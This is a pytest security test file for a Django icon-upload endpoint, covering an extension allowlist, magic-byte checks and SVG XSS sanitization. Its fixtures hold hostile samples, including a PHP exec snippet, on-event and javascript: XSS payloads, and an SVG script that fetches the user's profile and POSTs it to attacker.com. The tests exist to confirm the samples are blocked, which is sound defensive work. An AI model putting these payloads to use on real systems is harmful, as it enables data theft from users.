"""
Story 30.5 — Security tests for upload validation.
SEC-5: Extension allowlist
SEC-6: SVG XSS sanitization
SEC-10: Magic bytes validation
"""

import pytest
from django.core.files.uploadedfile import SimpleUploadedFile
from rest_framework.test import APIClient
from rest_framework import status
from idp_auth.models import User
from integrations.upload_views import sanitize_svg


# --- Minimal valid magic bytes for each image format ---
PNG_MAGIC = b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00\x90wS\xde'
JPEG_MAGIC = b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
GIF_MAGIC = b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;'
SVG_VALID = b'<svg xmlns="http://www.w3.org/2000/svg"><circle r="10"/></svg>'

# Executable magic bytes (PE header)
EXE_MAGIC = b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00'


@pytest.fixture
def dbops_user(db):
    return User.objects.create(username='sec_dbops_user', profile='dbops')


@pytest.fixture
def api_client(dbops_user):
    client = APIClient()
    client.force_authenticate(user=dbops_user)
    return client


UPLOAD_URL = '/api/v1/admin/integrations/upload-icon/'


# ========================================================================
# SEC-5: Extension allowlist tests
# ========================================================================


class TestExtensionAllowlist:
    """SEC-5: Validate extension against allowlist."""

    def test_png_extension_accepted(self, api_client):
        """PNG extension should be accepted."""
        file = SimpleUploadedFile("icon.png", PNG_MAGIC, content_type='image/png')
        response = api_client.post(UPLOAD_URL, {'file': file}, format='multipart')
        assert response.status_code == status.HTTP_201_CREATED

    def test_jpg_extension_accepted(self, api_client):
        """JPG extension should be accepted."""
        file = SimpleUploadedFile("icon.jpg", JPEG_MAGIC, content_type='image/jpeg')
        response = api_client.post(UPLOAD_URL, {'file': file}, format='multipart')
        assert response.status_code == status.HTTP_201_CREATED

    def test_jpeg_extension_accepted(self, api_client):
        """JPEG extension should be accepted."""
        file = SimpleUploadedFile("icon.jpeg", JPEG_MAGIC, content_type='image/jpeg')
        response = api_client.post(UPLOAD_URL, {'file': file}, format='multipart')
        assert response.status_code == status.HTTP_201_CREATED

    def test_svg_extension_accepted(self, api_client):
        """SVG extension should be accepted."""
        file = SimpleUploadedFile("icon.svg", SVG_VALID, content_type='image/svg+xml')
        response = api_client.post(UPLOAD_URL, {'file': file}, format='multipart')
        assert response.status_code == status.HTTP_201_CREATED

    def test_gif_extension_accepted(self, api_client):
        """GIF extension should be accepted."""
        file = SimpleUploadedFile("icon.gif", GIF_MAGIC, content_type='image/gif')
        response = api_client.post(UPLOAD_URL, {'file': file}, format='multipart')
        assert response.status_code == status.HTTP_201_CREATED

    def test_exe_extension_rejected(self, api_client):
        """EXE extension must be rejected."""
        file = SimpleUploadedFile("malware.exe", PNG_MAGIC, content_type='image/png')
        response = api_client.post(UPLOAD_URL, {'file': file}, format='multipart')
        assert response.status_code == status.HTTP_400_BAD_REQUEST
        assert response.data['error']['code'] == 'INVALID_EXTENSION'

    def test_sh_extension_rejected(self, api_client):
        """Shell script extension must be rejected."""
        file = SimpleUploadedFile("script.sh", b'#!/bin/bash\necho pwned', content_type='image/png')
        response = api_client.post(UPLOAD_URL, {'file': file}, format='multipart')
        assert response.status_code == status.HTTP_400_BAD_REQUEST
        assert response.data['error']['code'] == 'INVALID_EXTENSION'

    def test_bat_extension_rejected(self, api_client):
        """BAT extension must be rejected."""
        file = SimpleUploadedFile("script.bat", b'@echo off', content_type='image/png')
        response = api_client.post(UPLOAD_URL, {'file': file}, format='multipart')
        assert response.status_code == status.HTTP_400_BAD_REQUEST
        assert response.data['error']['code'] == 'INVALID_EXTENSION'

    def test_php_extension_rejected(self, api_client):
        """PHP extension must be rejected."""
        file = SimpleUploadedFile("shell.php", b'<?php exec("id"); ?>', content_type='image/png')
        response = api_client.post(UPLOAD_URL, {'file': file}, format='multipart')
        assert response.status_code == status.HTTP_400_BAD_REQUEST

    def test_html_extension_rejected(self, api_client):
        """HTML extension must be rejected."""
        file = SimpleUploadedFile("xss.html", b'<script>alert(1)</script>', content_type='image/png')
        response = api_client.post(UPLOAD_URL, {'file': file}, format='multipart')
        assert response.status_code == status.HTTP_400_BAD_REQUEST

    def test_no_extension_rejected(self, api_client):
        """File without extension must be rejected."""
        file = SimpleUploadedFile("noext", PNG_MAGIC, content_type='image/png')
        response = api_client.post(UPLOAD_URL, {'file': file}, format='multipart')
        assert response.status_code == status.HTTP_400_BAD_REQUEST


# ========================================================================
# SEC-10: Magic bytes validation tests
# ========================================================================


class TestMagicBytesValidation:
    """SEC-10: Validate magic bytes match declared MIME type."""

    def test_valid_png_magic_bytes(self, api_client):
        """PNG with valid magic bytes should pass."""
        file = SimpleUploadedFile("icon.png", PNG_MAGIC, content_type='image/png')
        response = api_client.post(UPLOAD_URL, {'file': file}, format='multipart')
        assert response.status_code == status.HTTP_201_CREATED

    def test_valid_jpeg_magic_bytes(self, api_client):
        """JPEG with valid magic bytes should pass."""
        file = SimpleUploadedFile("icon.jpg", JPEG_MAGIC, content_type='image/jpeg')
        response = api_client.post(UPLOAD_URL, {'file': file}, format='multipart')
        assert response.status_code == status.HTTP_201_CREATED

    def test_valid_gif_magic_bytes(self, api_client):
        """GIF with valid magic bytes should pass."""
        file = SimpleUploadedFile("icon.gif", GIF_MAGIC, content_type='image/gif')
        response = api_client.post(UPLOAD_URL, {'file': file}, format='multipart')
        assert response.status_code == status.HTTP_201_CREATED

    def test_exe_magic_bytes_with_png_extension_rejected(self, api_client):
        """File with EXE magic bytes but PNG extension must be rejected."""
        file = SimpleUploadedFile("icon.png", EXE_MAGIC, content_type='image/png')
        response = api_client.post(UPLOAD_URL, {'file': file}, format='multipart')
        assert response.status_code == status.HTTP_400_BAD_REQUEST
        assert response.data['error']['code'] == 'MAGIC_BYTES_MISMATCH'

    def test_text_content_with_png_extension_rejected(self, api_client):
        """Plain text content with PNG extension must be rejected."""
        file = SimpleUploadedFile("icon.png", b'This is plain text, not an image', content_type='image/png')
        response = api_client.post(UPLOAD_URL, {'file': file}, format='multipart')
        assert response.status_code == status.HTTP_400_BAD_REQUEST


# ========================================================================
# SEC-6: SVG XSS sanitization tests
# ========================================================================


class TestSVGSanitization:
    """SEC-6: SVG files must be sanitized against XSS."""

    def test_svg_script_tag_removed(self):
        """SVG with <script> tag must have it removed."""
        malicious_svg = b'''<svg xmlns="http://www.w3.org/2000/svg">
            <script>alert('XSS')</script>
            <circle cx="50" cy="50" r="40"/>
        </svg>'''
        sanitized = sanitize_svg(malicious_svg)
        assert b'<script' not in sanitized
        assert b'alert' not in sanitized
        assert b'circle' in sanitized

    def test_svg_onclick_removed(self):
        """SVG with onclick attribute must have it removed."""
        malicious_svg = b'<svg xmlns="http://www.w3.org/2000/svg"><circle onclick="alert(1)" r="10"/></svg>'
        sanitized = sanitize_svg(malicious_svg)
        assert b'onclick' not in sanitized
        assert b'circle' in sanitized

    def test_svg_onerror_removed(self):
        """SVG with onerror attribute must have it removed."""
        malicious_svg = b'<svg xmlns="http://www.w3.org/2000/svg"><image onerror="alert(1)" href="x"/></svg>'
        sanitized = sanitize_svg(malicious_svg)
        assert b'onerror' not in sanitized

    def test_svg_onload_removed(self):
        """SVG with onload attribute must have it removed."""
        malicious_svg = b'<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><circle r="10"/></svg>'
        sanitized = sanitize_svg(malicious_svg)
        assert b'onload' not in sanitized

    def test_svg_onmouseover_removed(self):
        """SVG with onmouseover attribute must have it removed."""
        malicious_svg = b'<svg xmlns="http://www.w3.org/2000/svg"><rect onmouseover="alert(1)" width="100" height="100"/></svg>'
        sanitized = sanitize_svg(malicious_svg)
        assert b'onmouseover' not in sanitized

    def test_svg_javascript_href_removed(self):
        """SVG with javascript: href must have it removed."""
        malicious_svg = b'<svg xmlns="http://www.w3.org/2000/svg"><a href="javascript:alert(1)"><text>Click</text></a></svg>'
        sanitized = sanitize_svg(malicious_svg)
        assert b'javascript:' not in sanitized

    def test_svg_style_with_javascript_removed(self):
        """SVG with <style> containing javascript must have it removed."""
        malicious_svg = b'<svg xmlns="http://www.w3.org/2000/svg"><style>body { background: javascript:alert(1) }</style><circle r="10"/></svg>'
        sanitized = sanitize_svg(malicious_svg)
        assert b'javascript' not in sanitized

    def test_svg_valid_content_preserved(self):
        """Valid SVG content must be preserved after sanitization."""
        valid_svg = b'<svg xmlns="http://www.w3.org/2000/svg"><circle cx="50" cy="50" r="40" fill="red"/></svg>'
        sanitized = sanitize_svg(valid_svg)
        assert b'circle' in sanitized
        assert b'fill="red"' in sanitized

    def test_svg_complex_xss_payload(self):
        """Complex XSS payload with token exfiltration must be sanitized."""
        malicious_svg = b'''<svg xmlns="http://www.w3.org/2000/svg">
            <script>
                fetch('/api/v1/profile/me').then(r => r.json()).then(data => {
                    fetch('https://attacker.com/exfiltrate', { method: 'POST', body: JSON.stringify(data) });
                });
            </script>
            <circle cx="50" cy="50" r="40" />
        </svg>'''
        sanitized = sanitize_svg(malicious_svg)
        assert b'<script' not in sanitized
        assert b'fetch' not in sanitized
        assert b'attacker' not in sanitized
        assert b'circle' in sanitized

    def test_svg_upload_sanitized_on_disk(self, api_client, tmp_path):
        """Uploaded SVG with XSS is saved sanitized on disk."""
        malicious_svg = b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert("xss")</script><circle r="10"/></svg>'
        file = SimpleUploadedFile("icon.svg", malicious_svg, content_type='image/svg+xml')
        response = api_client.post(UPLOAD_URL, {'file': file}, format='multipart')
        assert response.status_code == status.HTTP_201_CREATED

    def test_svg_malformed_xml_rejected(self):
        """Malformed SVG (not valid XML) must be rejected."""
        from core.exceptions import InvalidStateError
        malformed = b'<svg><script>alert(1)</script><not closed'
        with pytest.raises(InvalidStateError) as exc_info:
            sanitize_svg(malformed)
        assert exc_info.value.code == 'INVALID_SVG'
